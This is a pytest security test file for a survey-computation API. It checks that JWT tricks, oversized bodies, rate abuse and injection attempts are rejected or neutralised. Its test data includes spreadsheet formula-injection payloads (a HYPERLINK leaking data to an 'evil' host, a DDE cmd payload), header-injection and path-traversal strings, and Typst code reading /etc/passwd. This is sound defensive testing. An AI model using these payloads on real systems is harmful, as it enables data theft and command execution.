"""Security controls of the engine API (see docs/security.md)."""

import asyncio
import io
import json
import sys
import time
import zipfile
from pathlib import Path

import jwt
import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient

sys.path.insert(0, str(Path(__file__).parents[2] / "engine" / "tests"))
from test_api import SECRET, make_settings, project_json, token

from atsurvey import ControlPoint, Observation, ProjectInput, Setup
from atsurvey.exports.sanitize import safe_text
from atsurvey_api import auth
from atsurvey_api.config import Settings, get_settings
from atsurvey_api.main import app
from atsurvey_api.security import RateLimiter, TokenBucketLimiter, run_guarded


@pytest.fixture
def client():
    app.dependency_overrides[get_settings] = lambda: make_settings()
    auth._plan_cache.clear()
    auth._token_cache.clear()
    yield TestClient(app, raise_server_exceptions=False)
    app.dependency_overrides.clear()


def bearer(tok: str) -> dict:
    return {"Authorization": f"Bearer {tok}"}


# ------------------------------------------------------------------------ headers / errors


def test_security_headers(client):
    r = client.get("/health")
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.headers["referrer-policy"] == "no-referrer"
    assert r.headers["x-frame-options"] == "DENY"
    r = client.post("/v1/compute", json=project_json())
    assert r.headers["cache-control"] == "no-store"


def test_unhandled_errors_do_not_leak():
    async def boom():
        raise RuntimeError("secret internal detail /etc/passwd")

    app.add_api_route("/v1/__boom", boom)
    try:
        r = TestClient(app, raise_server_exceptions=False).get("/v1/__boom")
        assert r.status_code == 500
        assert r.json() == {"detail": "Internal error"}
        assert "secret" not in r.text
    finally:
        app.router.routes = [
            rt for rt in app.router.routes if getattr(rt, "path", "") != "/v1/__boom"
        ]


# ------------------------------------------------------------------------------- JWT


def test_token_errors_are_generic(client):
    bad = jwt.encode(
        {"sub": "x", "aud": "authenticated"}, "wrong-secret-0123456789abcdefgh", "HS256"
    )
    r = client.post("/v1/compute", json=project_json(), headers=bearer(bad))
    assert r.status_code == 401
    assert r.json()["detail"] == "Invalid or expired token"
    assert r.headers["www-authenticate"] == "Bearer"


@pytest.mark.parametrize(
    "claims",
    [
        {"iss": "https://evil.example/auth/v1"},  # wrong issuer
        {"aud": "anon"},  # wrong audience
        {"exp": None},  # missing exp
    ],
)
def test_claims_are_enforced(client, claims):
    payload = {
        "sub": "u",
        "aud": "authenticated",
        "iss": "http://supabase.invalid/auth/v1",
        "exp": time.time() + 600,
        **claims,
    }
    payload = {k: v for k, v in payload.items() if v is not None}
    tok = jwt.encode(payload, SECRET, algorithm="HS256")
    assert client.post("/v1/compute", json=project_json(), headers=bearer(tok)).status_code == 401


def test_alg_none_rejected(client):
    tok = jwt.encode(
        {
            "sub": "u",
            "aud": "authenticated",
            "iss": "http://supabase.invalid/auth/v1",
            "exp": time.time() + 600,
        },
        None,
        algorithm="none",
    )
    assert client.post("/v1/compute", json=project_json(), headers=bearer(tok)).status_code == 401


def test_hs256_rejected_in_jwks_mode():
    """Algorithm confusion: in JWKS mode an HMAC token must be refused before any key fetch."""
    s = Settings(supabase_url="https://example.supabase.co")
    tok = jwt.encode(
        {"sub": "u", "aud": "authenticated", "exp": time.time() + 600},
        "public-key-as-secret" * 3,
        algorithm="HS256",
    )
    with pytest.raises(HTTPException) as exc:
        auth.verify_token(tok, s)
    assert exc.value.status_code == 401


def test_oversized_token_rejected(client):
    r = client.post("/v1/compute", json=project_json(), headers=bearer("a" * 9000))
    assert r.status_code == 401


def test_workspace_id_must_be_uuid(client):
    r = client.get("/v1/me?workspace_id=../../etc", headers=bearer(token()))
    assert r.status_code == 422


# ------------------------------------------------------------------------- configuration


def test_production_refuses_unsafe_config():
    with pytest.raises(ValueError, match="AUTH_DISABLED"):
        Settings(
            environment="production",
            auth_disabled=True,
            supabase_url="https://x.supabase.co",
            cors_origins=["https://app.example.com"],
        )
    with pytest.raises(ValueError, match="https"):
        Settings(environment="production", supabase_url="https://x.supabase.co")  # http origins
    ok = Settings(
        environment="production",
        supabase_url="https://x.supabase.co",
        cors_origins=["https://app.example.com"],
    )
    assert ok.environment == "production"


@pytest.mark.parametrize("origin", ["*", "https://*.example.com", "javascript:alert(1)", ""])
def test_cors_origins_must_be_explicit(origin):
    with pytest.raises(ValueError):
        Settings(cors_origins=[origin])


# ---------------------------------------------------------------------------- body limits


def test_body_limit_by_content_length(client):
    big = b"{" + b" " * (11 * 1024 * 1024) + b"}"
    r = client.post("/v1/compute", content=big, headers={"content-type": "application/json"})
    assert r.status_code == 413


def test_body_limit_streaming():
    def chunks():
        for _ in range(12):
            yield b" " * (1024 * 1024)

    r = TestClient(app, raise_server_exceptions=False).post(
        "/v1/compute", content=chunks(), headers={"content-type": "application/json"}
    )
    assert r.status_code == 413


@pytest.mark.parametrize("literal", ["NaN", "Infinity", "-Infinity", "1e400", "1e13"])
def test_non_finite_and_absurd_numbers_rejected(client, literal):
    body = json.dumps(project_json()).replace('"x": 476120.412', f'"x": {literal}', 1)
    r = client.post("/v1/compute", content=body, headers={"content-type": "application/json"})
    assert r.status_code == 422
    assert "Invalid number" in r.json()["detail"]


def test_deeply_nested_json(client):
    body = "[" * 100_000 + "]" * 100_000
    r = client.post("/v1/compute", content=body, headers={"content-type": "application/json"})
    assert r.status_code == 422


def test_input_size_guards(client):
    body = project_json()
    body["traverses"] = [{"route": [f"P{i}" for i in range(600)]}]
    r = client.post("/v1/compute", json=body)
    assert r.status_code == 413 and "route points" in r.json()["detail"]


# ---------------------------------------------------------------------------- rate limits


def test_token_bucket_refills():
    b = TokenBucketLimiter(per_minute=60, burst=2)
    assert b.take("k", now=0) == 0 and b.take("k", now=0) == 0
    assert b.take("k", now=0) > 0  # empty
    assert b.take("k", now=1.01) == 0  # one token per second
    assert b.take("other", now=0) == 0  # independent keys


def test_rate_limit_returns_429_with_retry_after(client):
    previous = app.state.rate_limiter
    app.state.rate_limiter = RateLimiter(
        make_settings(rate_limit_per_minute=60, rate_limit_burst=3, rate_limit_heavy_burst=1)
    )
    try:
        codes = [client.post("/v1/compute", json=project_json()).status_code for _ in range(5)]
        assert codes[:3] == [200, 200, 200] and codes[3] == 429
        r = client.post("/v1/compute", json=project_json())
        assert r.status_code == 429 and int(r.headers["retry-after"]) >= 1
        # a signed-in user has their own bucket
        assert (
            client.post("/v1/compute", json=project_json(), headers=bearer(token())).status_code
            == 200
        )
        # /health is never limited
        assert client.get("/health").status_code == 200
    finally:
        app.state.rate_limiter = previous


def test_heavy_bucket_for_exports(client):
    previous = app.state.rate_limiter
    app.state.rate_limiter = RateLimiter(
        make_settings(rate_limit_burst=100, rate_limit_heavy_burst=2, rate_limit_heavy_per_minute=1)
    )
    try:
        req = {"format": "csv", "project_name": "p", "input": project_json()}
        codes = [client.post("/v1/export", json=req).status_code for _ in range(3)]
        assert codes == [200, 200, 429]
        assert client.post("/v1/compute", json=project_json()).status_code == 200
    finally:
        app.state.rate_limiter = previous


def test_forwarded_for_only_trusted_behind_proxy():
    scope = {"client": ("10.0.0.2", 1), "headers": [(b"x-forwarded-for", b"203.0.113.9, 10.0.0.2")]}
    assert RateLimiter(make_settings()).client_ip(scope) == "10.0.0.2"
    assert RateLimiter(make_settings(trusted_proxy=True)).client_ip(scope) == "203.0.113.9"


# ----------------------------------------------------------------------- computation guards


def test_concurrency_semaphore_returns_503():
    s = make_settings(max_concurrent_computations=1, compute_queue_timeout_s=0.1)

    async def scenario():
        slow = asyncio.create_task(run_guarded(s, time.sleep, 0.6, timeout=5))
        await asyncio.sleep(0.05)
        with pytest.raises(HTTPException) as exc:
            await run_guarded(s, time.sleep, 0, timeout=5)
        assert exc.value.status_code == 503
        await slow

    asyncio.run(scenario())


def test_suggest_route_enumeration_is_killed(client):
    """A tiny, densely inter-observed network makes route enumeration factorial; the
    child process must be killed at the timeout instead of pinning a CPU for hours."""
    app.dependency_overrides[get_settings] = lambda: make_settings(suggest_timeout_s=1.5)
    names = [f"P{i}" for i in range(14)]
    setups = [
        Setup(
            station=s,
            observations=[
                Observation(target=t, hz=0.1 * j, v=1.5, sd=100.0)
                for j, t in enumerate(names)
                if t != s
            ],
        )
        for s in names
    ]
    setups[0].observations.append(Observation(target="A", hz=3.0, v=1.5, sd=100.0))
    inp = ProjectInput(
        control_points=[ControlPoint(name="A", x=0, y=0), ControlPoint(name="P0", x=100, y=0)],
        setups=setups,
    )
    t0 = time.monotonic()
    r = client.post("/v1/suggest-traverses", json=inp.model_dump(mode="json"))
    assert r.status_code == 504
    assert time.monotonic() - t0 < 10


# ------------------------------------------------------------------------------- exports


EVIL = ['=HYPERLINK("http://evil/?"&A1)', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "＝1+1"]


def _evil_project():
    body = project_json()
    for cp, evil in zip(body["control_points"], EVIL, strict=False):
        cp["code"] = evil
    body["control_points"][0]["name"] = "=1+1"
    for s in body["setups"]:
        if s["station"] == "T2":
            s["station"] = s["station"]
    return body


def test_csv_formula_injection_neutralised(client):
    r = client.post(
        "/v1/export", json={"format": "csv", "project_name": "p", "input": _evil_project()}
    )
    assert r.status_code == 200
    text = r.content.decode("utf-8-sig")
    for line in text.splitlines()[1:]:
        for cell in line.split(","):
            assert not cell or cell[0] not in "=+@＝" or cell.startswith("'"), cell
    assert "'=1+1" in text
    # numeric cells are untouched (negative numbers stay numbers)
    assert all(not c.startswith("'-") for c in text.replace("'-2+3", "").split(","))


def test_xlsx_never_contains_formulas(client, monkeypatch):
    async def pro(*a, **k):
        return "pro"

    monkeypatch.setattr("atsurvey_api.main.plan_for", pro)
    r = client.post(
        "/v1/export", json={"format": "xlsx", "project_name": "p", "input": _evil_project()}
    )
    assert r.status_code == 200
    z = zipfile.ZipFile(io.BytesIO(r.content))
    for name in z.namelist():
        if name.startswith("xl/worksheets/"):
            assert b"<f>" not in z.read(name), name
            assert b"<hyperlink" not in z.read(name)


def test_safe_text():
    assert safe_text("=SUM(A1)") == "'=SUM(A1)"
    assert safe_text("\t=1") == "'\t=1"
    assert safe_text("S1") == "S1"
    assert safe_text(None) == ""


@pytest.mark.parametrize(
    "name", ['a"; filename="evil.exe', "x\r\nSet-Cookie: a=b", "../../etc/passwd", "Αφίδνες\x00"]
)
def test_content_disposition_cannot_be_injected(client, name):
    r = client.post(
        "/v1/export", json={"format": "csv", "project_name": name, "input": project_json()}
    )
    assert r.status_code == 200
    cd = r.headers["content-disposition"]
    assert "\r" not in cd and "\n" not in cd and "set-cookie" not in {k.lower() for k in r.headers}
    plain = cd.split("filename=")[1].split(";")[0]
    assert (
        plain.count('"') == 2
        and "/" not in plain
        and ".." not in plain.strip('"').split(".csv")[0][:2]
    )


def test_typst_report_does_not_execute_user_text(client, monkeypatch):
    async def pro(*a, **k):
        return "pro"

    monkeypatch.setattr("atsurvey_api.main.plan_for", pro)
    body = project_json()
    body["control_points"][0]["name"] = '#panic("pwned")'
    body["control_points"][0]["code"] = '#read("/etc/passwd")'
    r = client.post(
        "/v1/export", json={"format": "pdf", "project_name": '#panic("x")', "input": body}
    )
    assert r.status_code == 200 and r.content[:5] == b"%PDF-"


def test_unknown_plan_formats_refused_for_anonymous(client):
    for fmt in ("xlsx", "shp", "dxf", "pdf"):
        r = client.post(
            "/v1/export", json={"format": fmt, "project_name": "p", "input": project_json()}
        )
        assert r.status_code == 402
